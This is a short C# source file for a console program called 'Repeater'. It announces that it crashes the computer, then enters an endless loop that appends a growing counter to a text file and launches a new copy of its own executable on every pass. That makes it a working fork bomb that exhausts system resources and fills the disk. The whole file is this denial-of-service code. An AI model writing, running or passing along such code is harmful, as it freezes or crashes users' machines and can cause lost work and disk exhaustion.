using System;
using System.Threading;
using System.Diagnostics;
using System.IO;
using System.Reflection;
namespace Repeater
{
    public static class Repeat
    {
        public const string InternalVersion = "1.0.8";
        public static ulong x = ulong.MinValue;
        public static string Xpath = "X (Repeater).txt";
        public static bool Always = true;
        public static string Prgm = Assembly.GetExecutingAssembly().GetName().Name;
        public static void Main(string[] args)
        {
            Console.Title = "Repeater v" + InternalVersion;
            Console.ForegroundColor = ConsoleColor.DarkYellow;
            Console.BackgroundColor = ConsoleColor.DarkRed;
            string Message = "You just launched a program that crashes your computer!";
            Console.WriteLine(Message);
            Thread.Sleep(100);
            while (Always)
            {
                Console.Out.Flush();
                x++;
                string StrX = x.ToString();
                File.AppendAllText(Xpath, StrX);
                Console.Write('\r'+ StrX);
                Console.Out.Flush();
                Process.Start(Prgm + ".exe");
            }
        }
    }
}